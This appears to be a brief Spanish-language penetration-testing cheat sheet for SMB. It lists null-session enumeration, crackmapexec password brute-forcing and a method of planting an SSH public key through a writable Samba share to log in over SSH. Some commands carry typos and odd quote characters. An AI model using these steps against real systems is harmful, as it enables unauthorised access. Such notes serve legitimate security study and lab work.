Enumeración SMB:

```bash
enum4linux  -a IP
```

Conectarse al IPC$ (inter-Process Communication)

```bash
smbclient //IP/IPC$ -U “” -N
```

Enumeración sin proporcionar credenciales:

```bash
rpcclient -U “” -N IP

enumdomusers
```

Fuerza bruta SMB:

```bash
crackmapexec smb IP -u users.txt -p DICCIONARIO —shares
```

Enumeración de recursos compartidos:

```bash
smbclient //IP/”recurso” -U USER
```

## Entrar a ssh desde Samba:

Dentro de samba :

```bash
mkdir .ssh
```

Desde el host :

```bash
ssh-keygen -t rsa -b 4096

cp ~/.ssh/id_rsa.pub .
```

Dentro de samba

```bash
cd.ssh/
putid_rsa.pub
```

Desde el host :

```bash
cat id_rsa.pub > authorized_keys
```

Desde Samba : 

```bash
put authorized_keys
```

Y logeamos ssh

```bash
ssh -i ~/.ssh/id_rsa USER@<IP>
```
